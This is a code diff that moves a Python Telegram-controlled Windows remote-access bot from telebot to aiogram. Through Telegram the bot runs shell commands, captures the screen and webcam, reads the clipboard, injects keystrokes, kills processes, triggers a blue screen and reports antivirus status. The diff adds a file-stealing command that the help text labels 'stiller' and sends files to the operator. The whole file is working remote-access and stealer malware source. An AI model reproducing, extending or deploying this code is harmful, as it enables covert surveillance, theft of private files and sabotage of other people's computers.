@@ -1,155 +1,141 @@
-import telebot
+import logging
+from aiogram import Bot, Dispatcher, types, Router
+from aiogram.client.default import DefaultBotProperties
+from aiogram.filters import Command
+from aiogram.types import BufferedInputFile
+from aiogram.utils.keyboard import ReplyKeyboardBuilder, KeyboardButton
+from aiogram.fsm.state import StatesGroup, State
+from aiogram.fsm.context import FSMContext
 import ctypes
 from ctypes import wintypes
 import os
+import json
+
+def load_data():
+    try:
+        with open("user.json", "r", encoding="utf-8") as v:
+            data = json.load(v)
+            return data
+    except FileNotFoundError:
+        print("i cant found 'user.json'\n")
+
+class WindowKillStates(StatesGroup):
+    waiting_for_confirm = State()
 
 class Core:
-    def __init__(self, token):
-        self.bot = telebot.TeleBot(token)
-        self.ADMIN_ID = 1234567890
-        self.display_pass = True
-        self.wmic_pass = True
-        self.wmic_info = None
-        self.sinfo_info = None
-
-        self.text = """
-        __________________________________________________________
+    def __init__(self, token, admin):
+        self.bot = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
+        self.dp = Dispatcher()
+        self.router = Router()
+        self.ADMIN_ID = admin
+        self.text = """ ᅠ
         
-    /help - show all commands\n
-    /scr - takes a screenshot of the entire screen\n
-    /cmd - runs command from cmd\n
-    /write - entrys any text\n
-    /key - presses any keys\n
-    /ct_notify - dialog window based on ctypes\n
-    /pl_notify - notification based on plyer\n
-    /sinfo - all information about system\n
-    /pinfo - info about all active windows\n
-    /clipb - getting any text from clipboard\n
-    /web - opening any urls\n
-    /mon - off, on and lock display\n 
-    /wkill - killing active window\n
-    /shutdown - shutdown or reboot pc\n
-    /pscan - scanning all ports\n
-    /bsod - blue screen of death\n
+/help - show all commands\n
+/scr - takes a screenshot of the entire screen\n
+/cmd - runs command from cmd\n
+/write - entrys any text\n
+/key - presses any keys\n
+/ct_notify - dialog window on ctypes\n
+/pl_notify - notification on plyer\n
+/sinfo - all information about system\n
+/pinfo - info about all active windows\n
+/clipb - getting any text from clipboard\n
+/web - opening any urls\n
+/mon - off, on and lock display\n 
+/wkill - killing active window\n
+/shutdown - shutdown or reboot pc\n
+/pscan - scanning all ports\n
+/bsod - blue screen of death\n
+/cam - takes screenshot from the front camera\n
+/get - get files from pc (stiller)\n
         """
 
         self.bind_handlers()
+        self.dp.include_router(self.router)
 
     def bind_handlers(self):
-        @self.bot.message_handler(commands=['start'])
-        def _start(message):
-            self.start_command(message)
-
-        @self.bot.message_handler(commands=['help'])
-        def _help(message):
-            self.help_command(message)
-
-        @self.bot.message_handler(commands=['cmd'])
-        def _cmd(message):
-            self.cmd_command(message)
-
-        @self.bot.message_handler(commands=['scr'])
-        def _screenshot(message):
-            self.screenshot_command(message)
-
-        @self.bot.message_handler(commands=['write'])
-        def _pywrite(message):
-            self.write_command(message)
-
-        @self.bot.message_handler(commands=['key'])
-        def _pykey(message):
-            self.key_command(message)
-
-        @self.bot.message_handler(commands=['ct_notify'])
-        def _ctnotif(message):
-            self.notify_command(message)
-
-        @self.bot.message_handler(commands=['pl_notify'])
-        def _plnotif(message):
-            self.pl_notif(message)
-
-        @self.bot.message_handler(commands=["mon"])
-        def _moff(message):
-            self.monitor_commands(message)
-
-        @self.bot.message_handler(commands=["wkill"])
-        def _wkill(message):
-            self.window_kill_command(message)
-
-        @self.bot.message_handler(commands=['sinfo'])
-        def _sysinfo(message):
-            self.sinfo_command(message)
-
-        @self.bot.message_handler(commands=['pinfo'])
-        def _procinfo(message):
-            self.list_all_windows(message)
-
-        @self.bot.message_handler(commands=['clipb'])
-        def _wclipboard(message):
-            self.get_clipboard(message)
-
-        @self.bot.message_handler(commands=['web'])
-        def _openweb(message):
-            self.web_command(message)
-
-        @self.bot.message_handler(commands=['pscan'])
-        def _scanports(message):
-            self.scan_port(message)
-
-        @self.bot.message_handler(commands=['shutdown'])
-        def _shutdown(message):
-            self.shutdown_command(message)
-
-        @self.bot.message_handler(commands=['bsod'])
-        def _bsd(message):
-            self.bsod_command(message)
+        self.router.message.register(self.start_command, Command("start"))
+        self.router.message.register(self.help_command, Command("help"))
+        self.router.message.register(self.cmd_command, Command("cmd"))
+        self.router.message.register(self.screenshot_command, Command("scr"))
+        self.router.message.register(self.write_command, Command("write"))
+        self.router.message.register(self.key_command, Command("key"))
+        self.router.message.register(self.notify_command, Command("ct_notify"))
+        self.router.message.register(self.pl_notif, Command("pl_notify"))
+        self.router.message.register(self.monitor_commands, Command("mon"))
+        self.router.message.register(self.window_kill_command, Command("wkill"))
+        self.router.message.register(self.process_answer, WindowKillStates.waiting_for_confirm)
+        self.router.message.register(self.sinfo_command, Command("sinfo"))
+        self.router.message.register(self.list_all_windows, Command("pinfo"))
+        self.router.message.register(self.get_clipboard, Command("clipb"))
+        self.router.message.register(self.web_command, Command("web"))
+        self.router.message.register(self.scan_port, Command("pscan"))
+        self.router.message.register(self.shutdown_command, Command("shutdown"))
+        self.router.message.register(self.bsod_command, Command("bsod"))
+        self.router.message.register(self.send_jpg, Command("cam"))
+        self.router.message.register(self.get_files, Command("get"))
 
 
-    def start_command(self, message):
+    async def start_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             user = message.from_user
-            self.bot.send_message(self.ADMIN_ID, f"КТО-ТО ПОПЫТАЛСЯ ПОЛУЧИТЬ ДОСТУП К БОТУ\n@{user.username}\nID: {user.id}")
+            await self.bot.send_message(self.ADMIN_ID, f"КТО-ТО ПОПЫТАЛСЯ ПОЛУЧИТЬ ДОСТУП К БОТУ\n@{user.username}\nID: <code>{user.id}</code>")
             return
-        self.help_command(message)
+        com_list = ["/help", "/cmd", "/scr", "/write", "/key", "/ct_notify", "/pl_notify", "/mon", "/wkill", "/sinfo", "/pinfo", "/clipb", "/web", "/pscan", "/shutdown", "/bsod", "/cam", "/get"]
+        builder = ReplyKeyboardBuilder()
+        for com in com_list:
+            builder.add(KeyboardButton(text=com))
+        builder.adjust(3)
 
-    def help_command(self, message):
+        await message.answer("hello.", reply_markup=builder.as_markup(resize_keyboard=True))
+
+    async def help_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
-        self.bot.send_message(self.ADMIN_ID, self.text)
+        try:
+            await self.bot.send_message(self.ADMIN_ID, self.text)
+        except Exception as e:
+            await message.reply(f"Error\n{e}")
 
-    def cmd_command(self, message):
+    async def cmd_command(self, message: types.Message):
         import subprocess
         if message.from_user.id != self.ADMIN_ID:
             return
 
         cmd = message.text.replace("/cmd ", "").strip()
         if not cmd:
-            self.bot.reply_to(message, "command?")
+            await message.reply("command?")
             return
 
-        process = subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE, stdout=subprocess.PIPE,
-    stderr=subprocess.PIPE,
-    text=True, encoding='cp866',)
-        stdout, stderr = process.communicate()
-        if stderr:
-            self.bot.reply_to(self.ADMIN_ID, f"Ошибка: {cmd}\n`{stderr}`", parse_mode="Markdown")
-            return
-        self.bot.reply_to(self.ADMIN_ID, f"Команда выполнена: {cmd}\n`{stdout}`", parse_mode="Markdown")
+        try:
+            process = subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='cp866',)
+            stdout, stderr = process.communicate()
+            if stderr:
+                await message.reply(f"Ошибка: {cmd}\n`{stderr}`", parse_mode="Markdown")
+                return
+            await message.reply(f"Команда выполнена: {cmd}\n`{stdout}`", parse_mode="Markdown")
+        except Exception as e:
+            await message.reply(f"Error\n{e}")
 
-    def screenshot_command(self, message):
+    async def screenshot_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
         import io
         import pyautogui
+        try:
+            buffer = io.BytesIO()
+            screenshot = pyautogui.screenshot()
+            screenshot.save(buffer, format='PNG')
+            pngs = BufferedInputFile(
+                file=buffer.getvalue(),
+                filename="scr.png"
+            )
+            await self.bot.send_photo(self.ADMIN_ID, photo=pngs)
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-        buffer = io.BytesIO()
-        screenshot = pyautogui.screenshot()
-        screenshot.save(buffer, format='PNG')
-        buffer.seek(0)
-        self.bot.send_photo(self.ADMIN_ID, buffer)
-
-    def write_command(self, message):
+    async def write_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
@@ -158,13 +144,15 @@ class Core:
 
         text = message.text.replace("/write ", "").strip()
         if not text:
-            self.bot.reply_to(message, "write any text")
+            await message.reply("write any text")
             return
+        try:
+            keyboard.type(text)
+            await message.reply(f"writed: {text}")
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-        keyboard.type(text)
-        self.bot.reply_to(message, f"writed: {text}")
-
-    def key_command(self, message):
+    async def key_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
@@ -201,7 +189,7 @@ class Core:
 
         key_text = message.text.replace("/key ", "").strip()
         if not key_text:
-            self.bot.reply_to(message, f"{special_keys}")
+            await message.reply(f"{special_keys}")
             return
 
         try:
@@ -217,25 +205,28 @@ class Core:
                 keyboard.press(key)
                 keyboard.release(key)
 
-            self.bot.reply_to(message, f"key pressed: {key_text}")
+            await message.reply(f"key pressed: {key_text}")
 
         except Exception as e:
-            self.bot.reply_to(message, f"error: {e}")
+            await message.reply(f"error\n{e}")
 
-    def notify_command(self, message):
+    async def notify_command(self, message: types.Message):
         import threading as th
         if message.from_user.id != self.ADMIN_ID:
             return
+
         parts = message.text.split(maxsplit=1)
         if len(parts) < 2:
-            self.bot.reply_to(message, "/ct_notify [text]")
+            await message.reply("/ct_notify [text]")
             return
         text = parts[1]
+        try:
+            th.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, "Hello, friend.", 0x10), daemon=True).start()
+            await message.reply(f"Message was shown\ntext: {text}")
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-        th.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, " ", 0x10), daemon=True).start()
-        self.bot.reply_to(message, f"Message was shown\ntext: {text}")
-
-    def pl_notif(self, message):
+    async def pl_notif(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
@@ -244,185 +235,100 @@ class Core:
 
         parts = message.text.split(maxsplit=2)
         if len(parts) < 3:
-            self.bot.reply_to(message, "preview /pl_notify [заголовок] [текст]")
+            await message.reply("preview /pl_notify [заголовок] [текст]")
             return
 
         title = parts[1].lower()
         text = parts[2]
 
-        th.Thread(target=lambda: notification.notify(title=title, message=text, app_name="System", timeout=10),daemon=True).start()
-        self.bot.reply_to(message, f"уведомление показано:\nЗаголовок: {title}\nТекст: {text}")
+        try:
+            th.Thread(target=lambda: notification.notify(title=title, message=text, app_name="System", timeout=10),daemon=True).start()
+            await message.reply(f"уведомление показано:\nЗаголовок: {title}\nТекст: {text}")
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-
-
-    def moff_command(self, message):
-        if self.display_pass:
-            if message.from_user.id != self.ADMIN_ID:
-                return
-        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
-        return self.bot.send_message(self.ADMIN_ID, "display was turned off")
-
-    def mon_command(self, message):
-        if self.display_pass:
-            if message.from_user.id != self.ADMIN_ID:
-                return
-        import time
-        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
-        ctypes.windll.user32.mouse_event(0x0001, 1, 1, 0, 0)
-        time.sleep(0.1)
-        ctypes.windll.user32.mouse_event(0x0001, -1, -1, 0, 0)
-        return self.bot.send_message(self.ADMIN_ID, "display was turned on")
-
-    def mlock_command(self, message):
-        if self.display_pass:
-            if message.from_user.id != self.ADMIN_ID:
-                return
-        ctypes.windll.user32.LockWorkStation()
-        return self.bot.send_message(self.ADMIN_ID, "display was locked")
-
-
-    def monitor_commands(self, message):
+    async def monitor_commands(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
-        self.display_pass = False
-        commands = {
-            "on": self.mon_command,
-            "off": self.moff_command,
-            "lock": self.mlock_command,
-        }
+        try:
+            from files import mon
+            await mon.mon_start(message)
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-        args = message.text.split()
+    async def window_kill_command(self, message: types.Message, state: FSMContext):
+        if message.from_user.id != self.ADMIN_ID:
+            return
 
-        if len(args) < 2:
-            return self.bot.reply_to(message, "arguments: on, off, lock")
 
-        action = args[1].lower()
-        command_func = commands.get(action)
+        try:
+            user32 = ctypes.windll.user32
+            hwnd = user32.GetForegroundWindow()
 
-        if command_func:
-            response = command_func(self.ADMIN_ID)
-            if response:
-                pass
+            length = user32.GetWindowTextLengthW(hwnd)
+            if length > 0:
+                buff = ctypes.create_unicode_buffer(length + 1)
+                user32.GetWindowTextW(hwnd, buff, length + 1)
+                title = buff.value
             else:
-                self.bot.send_message(self.ADMIN_ID, f"Команда {action} выполнена, но отчет не получен.")
-        else:
-            self.bot.reply_to(message, "unknown argument\narguments: on, off, lock")
+                title = "Заголовок отсутствует"
 
-    def window_kill_command(self, message):
-        if message.from_user.id != self.ADMIN_ID:
-            return
+            pid = wintypes.DWORD()
+            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+            pid_value = pid.value
 
-        user32 = ctypes.windll.user32
-        hwnd = user32.GetForegroundWindow()
+            info_text = f"Window: {title}\nHWND:{hwnd}\nPID: {pid_value}\n\nЗакрыть? (y/n)"
 
-        length = user32.GetWindowTextLengthW(hwnd)
-        if length > 0:
-            buff = ctypes.create_unicode_buffer(length + 1)
-            user32.GetWindowTextW(hwnd, buff, length + 1)
-            title = buff.value
-        else:
-            title = "Заголовок отсутствует"
+            await state.update_data(kill_hwnd=hwnd, kill_pid=pid_value, kill_title=title)
+            await state.set_state(WindowKillStates.waiting_for_confirm)
 
-        pid = wintypes.DWORD()
-        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
-        pid_value = pid.value
+            await message.answer(info_text)
 
-        info_text = f"Window: {title}\nHWND:{hwnd}\nPID: {pid_value}\n\nЗакрыть? (y/n)"
-        sent_msg = self.bot.send_message(message.chat.id, info_text)
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-        self.bot.register_next_step_handler(sent_msg, self.process_answer, hwnd, pid_value, title)
+    async def process_answer(self, message: types.Message, state: FSMContext):
+        try:
+            user32 = ctypes.windll.user32
 
-    def process_answer(self, message, hwnd, pid_value, title):
-        user32 = ctypes.windll.user32
-        answer = message.text.lower().strip()
-        if answer in ("y", "u", "н", "г"):
-            if user32.IsWindow(hwnd):
-                os.system(f"taskkill /PID {pid_value} /F /T >nul 2>&1")
-                self.bot.send_message(message.chat.id, f"{title}\nPID: {pid_value}\nwas closed")
+            data = await state.get_data()
+            hwnd = data['kill_hwnd']
+            pid_value = data['kill_pid']
+            title = data['kill_title']
+
+            answer = message.text.lower().strip()
+
+            if answer in ("y", "н"):
+                if user32.IsWindow(hwnd):
+                    os.system(f"taskkill /PID {pid_value} /F /T >nul 2>&1")
+                    await self.bot.send_message(message.chat.id, f"{title}\nPID: {pid_value}\nwas closed")
+                else:
+                    await self.bot.send_message(message.chat.id, "window not found")
+
+            elif answer in ("n", "б"):
+                await message.answer("Отмена.")
             else:
-                self.bot.send_message(message.chat.id, "window not found")
+                await message.answer("??? restart /wkill")
 
-        elif answer in ("n", "m", "ь", "б"):
-            self.bot.send_message(message.chat.id, "cancelled")
-        else:
-            self.bot.send_message(message.chat.id, "??? restart /wkill")
+            await state.clear()
 
-
-    def sinfo_send(self):
-        if self.sinfo_info is not None and self.wmic_info is not None:
-            import io
-            report_text = f"{self.sinfo_info}\n\n\n{self.wmic_info}"
-            text_buffer = io.BytesIO(report_text.encode('utf-8'))
-            text_buffer.name = "system_info.txt"
-            self.bot.send_document(self.ADMIN_ID, text_buffer)
+        except Exception as e:
+            await message.reply(f"error\n{e}")
+            await state.clear()
 
 
-
-    def wmic_sinfo(self, message):
-        if self.wmic_pass:
-            if message.from_user.id != self.ADMIN_ID:
-                return
-
-        import subprocess
-        def get_wmic(command):
-            try:
-                output = subprocess.check_output(f"wmic {command}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-                res = output.decode('utf-8', errors='ignore').strip()
-
-                values = []
-                for line in res.splitlines():
-                    if '=' in line:
-                        val = line.split('=', 1)[1].strip()
-                        if val: values.append(val)
-
-                return ", ".join(values) if values else "N/A"
-
-            except Exception:
-                return "Error"
-
-        self.wmic_info = (f"Serial Number: `{get_wmic("bios get serialnumber /value")}`\n"
-                     f"Disk model: `{get_wmic("diskdrive get model, InterfaceType /value")}`\n"
-                     f"Product model: `{get_wmic("csproduct get name /value")}`\n"
-                     f"Socket model: `{get_wmic("cpu get socketdesignation /value")}`\n\n"
-                     f"Display width: `{get_wmic("path win32_VideoController get CurrentHorizontalResolution /value")}`\n"
-                     f"Display height: `{get_wmic("path win32_VideoController get CurrentVerticalResolution /value")}`\n"
-                     f"Display refresh rate: `{get_wmic("path win32_VideoController get CurrentRefreshRate /value")}`\n\n"
-                     f"GPU: `{get_wmic("path win32_VideoController get name /value")}`\n"
-                     f"CPU: `{get_wmic("cpu get loadpercentage /value")}%`\n"
-                     f"MotherBoard: `{get_wmic("baseboard get product,Manufacturer /value")}`\n"
-                     f"Bios version: `{get_wmic("bios get name, releaseDate, version /value")}`\n"
-                     f"All disks: `{get_wmic("logicaldisk get caption, freespace, size /value")}`\n"
-                     f"Defender: `{get_wmic(r"/namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName, productState /value")}`\n")
-
-        self.bot.reply_to(message, self.wmic_info, parse_mode="Markdown")
-        self.sinfo_send()
-
-    def sinfo_command(self, message):
+    async def sinfo_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
+        try:
+            from files import io_info_send as ioi
+            await ioi.run()
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-        self.wmic_pass = False
-        import psutil
-        import platform
 
 
-        mem = psutil.virtual_memory()
-        b = psutil.sensors_battery()
-        self.sinfo_info = (f"OS: `{platform.platform()}`\nName: `{platform.node()}`\nArch: `{platform.machine()}`\nProcessor: `{platform.processor()}`\nCPU count: `{psutil.cpu_count()}`\n\n"
-                              f"Python build: `{platform.python_build()}`\n"
-                              f"Compiler: `{platform.python_compiler()}`\n"
-                              f"Python version: `{platform.python_version()}`\n\n"
-                              f"Memory: `{mem.percent}%`\nMemory total: `{mem.total}`\n"
-                              f"Memory used: `{mem.used}`\n"
-                              f"Free memory: `{mem.free}`\n\n"
-                              f"Battery power: `{b.power_plugged}`\n"
-                              f"Battery percent: `{b.percent}`\n")
-
-        self.bot.reply_to(message, self.sinfo_info, parse_mode="Markdown")
-
-        self.wmic_sinfo(message)
-
-    def list_all_windows(self, message):
+    async def list_all_windows(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
         user32 = ctypes.windll.user32
@@ -437,17 +343,25 @@ class Core:
                     buff = ctypes.create_unicode_buffer(length + 1)
                     user32.GetWindowTextW(hwnd, buff, length + 1)
                     windows_list.append(f"ID `{hwnd}`\nTitle: {buff.value}")
+
             return True
 
-        user32.EnumWindows(WNDENUMPROC(enum_windows_proc), 0)
+        try:
+            user32.EnumWindows(WNDENUMPROC(enum_windows_proc), 0)
+        except Exception as e:
+            return await message.reply(f"Ошибка при переборе: {e}")
 
         if windows_list:
-            full_message = "*Windows list:*\n\n" + "\n\n".join(windows_list)
-            self.bot.send_message(message.chat.id, full_message, parse_mode="Markdown")
+            full_message = "Windows list:\n\n" + "\n\n".join(windows_list)
+            if len(full_message) > 4096:
+                for x in range(0, len(full_message), 4096):
+                    await message.answer(full_message[x:x + 4096], parse_mode="Markdown")
+            else:
+                await message.answer(full_message, parse_mode="Markdown")
         else:
-            self.bot.send_message(message.chat.id, "windows not found")
+            await message.answer("Windows not found")
 
-    def get_clipboard(self, message):
+    async def get_clipboard(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
@@ -483,26 +397,37 @@ class Core:
 
             return text
 
-        data = get_clipboard_text()
-        if data:
-            self.bot.send_message(ADMIN_ID, f"clipboard: {data}")
+        try:
+            data = get_clipboard_text()
+            if data:
+                await self.bot.send_message(self.ADMIN_ID, f"clipboard: {data}")
+            else:
+                await message.answer("none..")
+        except Exception as er:
+            await message.reply(f"error\n{er}")
 
-    def web_command(self, message):
+    async def web_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
         import webbrowser
         url = message.text.replace("/web ", "").strip()
-        webbrowser.open(url)
-        self.bot.reply_to(message, "url was opened")
+        try:
+            webbrowser.open(url)
+            await message.reply("url was opened")
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-    def scan_port(self, message):
+    async def scan_port(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
-        import port_scan
-        port_scan.run()
+        try:
+            from files import port_scan
+            await port_scan.run()
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-    def shutdown_command(self, message):
+    async def shutdown_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
@@ -510,42 +435,104 @@ class Core:
         parts = message.text.split(maxsplit=1)
         arg = parts[1]
         if len(parts) < 2:
-            self.bot.send_message(ADMIN_ID, "arguments\ns - shutdown\nr - reboot")
+            await self.bot.send_message(self.ADMIN_ID, "arguments\ns - shutdown\nr - reboot")
             return
 
         if arg == "s":
             try:
                 subprocess.run(["shutdown", "/S", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
             except Exception as e:
-                self.bot.send_message(ADMIN_ID, f"error\n{e}")
-            self.bot.send_message(ADMIN_ID, "pc was shutdowned")
+                await self.bot.send_message(self.ADMIN_ID, f"error\n{e}")
+            await self.bot.send_message(self.ADMIN_ID, "pc was shutdowned")
             return
 
         if arg == "r":
             try:
                 subprocess.run(["shutdown", "/R", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
             except Exception as e:
-                self.bot.send_message(ADMIN_ID, f"error\n{e}")
-            self.bot.send_message(ADMIN_ID, "pc was rebooted")
+                await self.bot.send_message(self.ADMIN_ID, f"error\n{e}")
+            await self.bot.send_message(self.ADMIN_ID, "pc was rebooted")
             return
 
-    def bsod_command(self, message):
+    async def bsod_command(self, message: types.Message):
         if message.from_user.id != self.ADMIN_ID:
             return
+        try:
+            ntdll = ctypes.windll.ntdll
+            enabled = ctypes.c_bool()
+            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
 
-        ntdll = ctypes.windll.ntdll
-        enabled = ctypes.c_bool()
-        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
+            response = ctypes.c_uint()
+            ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(response))
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
-        response = ctypes.c_uint()
-        ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(response))
+    async def send_jpg(self, message: types.Message):
+        import cv2
+        import io
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+
+        if not cap.isOpened():
+            await message.reply("не удалось найти камеру")
+            return
+
+        for _ in range(5):
+            cap.read()
+
+        ret, frame = cap.read()
+
+        try:
+            if ret:
+                success, buffer = cv2.imencode('.jpg', frame)
+                if success:
+                    photo_io = io.BytesIO(buffer)
+
+                    jpgio = BufferedInputFile(
+                        file=photo_io.getvalue(),
+                        filename="cvcam.jpg"
+                    )
+
+                    await self.bot.send_photo(self.ADMIN_ID, photo=jpgio)
+            cap.release()
+        except Exception as e:
+            await message.reply(f"error\n{e}")
 
 
-    def run(self):
+
+    async def get_files(self, message: types.Message):
+        if message.from_user.id != self.ADMIN_ID:
+            return
+        from aiogram.types import FSInputFile
+
+        path = message.text.replace("/get ", "").strip().replace('"', '')
+
+        if not path:
+            return await message.reply("write path to file")
+
+        if not os.path.exists(path):
+            return await message.reply("error: файл не найден")
+
+        try:
+            await message.answer("wait..")
+
+            document = FSInputFile(path)
+            await self.bot.send_document(self.ADMIN_ID, document=document)
+
+        except Exception as e:
+            await message.reply(f"Ошибка при отправке: {e}")
+
+    async def run(self):
         print(True)
-        self.bot.polling(none_stop=True)
+        logging.basicConfig(level=logging.INFO)
+        await self.dp.start_polling(self.bot, skip_updates=False)
 
 if __name__ == '__main__':
-    TOKEN = "your token"
-    app = Core(TOKEN)
-    app.run()
+    import asyncio
+    get = load_data()
+    TOKEN = get["token_1"]
+    ADMIN = get["admin"]
+    try:
+        app = Core(TOKEN, ADMIN)
+        asyncio.run(app.run())
+    except Exception as r:
+        print(r)
